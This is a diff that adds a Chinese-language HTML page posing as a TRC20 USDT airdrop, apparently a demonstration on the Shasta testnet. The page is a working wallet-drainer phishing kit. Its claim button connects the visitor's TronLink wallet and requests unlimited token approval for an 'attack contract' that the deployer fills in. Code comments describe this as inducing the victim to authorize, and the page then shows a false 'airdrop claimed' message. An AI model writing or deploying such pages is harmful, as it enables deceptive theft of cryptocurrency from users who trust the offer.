@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>TRC20空投 - 领取1000 USDT</title>
+    <meta charset="utf-8">
+    <!-- 引入TronWeb库 -->
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
+</head>
+<body>
+    <h2>🎉 波场生态空投活动</h2>
+    <p>连接TronLink钱包，即可领取 1000 USDT（测试网）</p>
+    <button id="connectBtn">连接钱包并领取</button>
+    <div id="status"></div>
+
+    <script>
+        // ========== 配置（请替换为你的实际地址）==========
+        const ATTACK_CONTRACT = "你的攻击合约地址";   // 第二步部署的攻击合约地址
+        const TOKEN_ADDRESS = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // Shasta测试USDT
+        // =============================================
+
+        document.getElementById("connectBtn").onclick = async () => {
+            if (!window.tronWeb || !window.tronWeb.defaultAddress) {
+                alert("请先安装并登录 TronLink 钱包");
+                return;
+            }
+            const userAddress = window.tronWeb.defaultAddress.base58;
+            document.getElementById("status").innerHTML = `已连接: ${userAddress}<br>正在授权...`;
+            
+            // 加载代币合约
+            const tokenContract = await window.tronWeb.contract().at(TOKEN_ADDRESS);
+            const maxUint = 2**256 - 1;  // 无限授权
+            
+            // 发起 approve（诱导受害者授权）
+            const approveTx = await tokenContract.approve(ATTACK_CONTRACT, maxUint).send({
+                shouldPollResponse: true,
+                feeLimit: 100_000_000
+            });
+            
+            document.getElementById("status").innerHTML = `
+                授权交易已发送: 
+                <a href="https://shasta.tronscan.org/#/transaction/${approveTx}" target="_blank">
+                    ${approveTx}
+                </a><br>等待确认...
+            `;
+            await window.tronWeb.trx.getTransactionInfo(approveTx);
+            document.getElementById("status").innerHTML += "<br>✅ 空投领取成功！";
+        };
+    </script>
+</body>
+      </html>
